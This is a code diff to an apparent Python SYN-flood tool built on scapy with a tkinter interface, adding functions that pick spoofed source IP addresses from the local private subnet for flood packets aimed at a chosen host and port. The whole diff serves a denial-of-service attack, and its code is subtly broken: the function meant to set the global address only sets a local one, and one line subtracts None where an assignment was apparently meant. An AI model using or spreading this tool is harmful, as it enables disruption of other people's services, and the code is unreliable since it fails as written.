@@ -4,6 +4,36 @@ import random
 from scapy.all import *
 import tkinter as tk
 from tkinter import ttk, messagebox
+import psutil
+import socket
+
+global_src_IP = None
+
+def get_src_ip():
+    networks = ['10.','172','192']
+    for iface, addrs in psutil.net_if_addrs().items():
+        for addr in addrs:
+            if addr.family == socket.AF_INET and addr.address[:3] in networks:
+                addr_split = addr.address.split(".")
+                subn_split = addr.netmask.split(".")
+                if(subn_split[1] == "0"): 
+                    global_src_IP = f"{addr_split[0]}.x.y.z"
+                    return
+                if(subn_split[2] == "0"): 
+                    global_src_IP = f"{addr_split[0]}.{addr_split[1]}.x.y"
+                    return
+                if(subn_split[3] == "0"): 
+                    global_src_IP = f"{addr_split[0]}.{addr_split[1]}.{addr_split[2]}.x"
+                    return
+                subn_split - None
+                addr_split = None
+
+def get_rand_ip():
+    if(global_src_IP is None): get_src_ip()
+    random_IP = global_src_IP.replace("x", str(random.randint(1, 254)))
+    random_IP = random_IP.replace("y", str(random.randint(1, 254)))
+    random_IP = random_IP.replace("z", str(random.randint(1, 254)))
+    return random_IP
 
 def guiFunction():
     def synFlood(destIP, destPort, packetCount, delay=0.1, outputText=None):
@@ -18,7 +48,7 @@ def guiFunction():
             print(f"[+] Sending {packetCount} packets with {delay}s delay\n")
 
         for i in range(1, packetCount + 1):
-            srcIP = f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
+            srcIP = get_rand_ip()
             packet = IP(src=srcIP, dst=destIP) / TCP(sport=RandShort(), dport=destPort, flags="S")
 
             try:
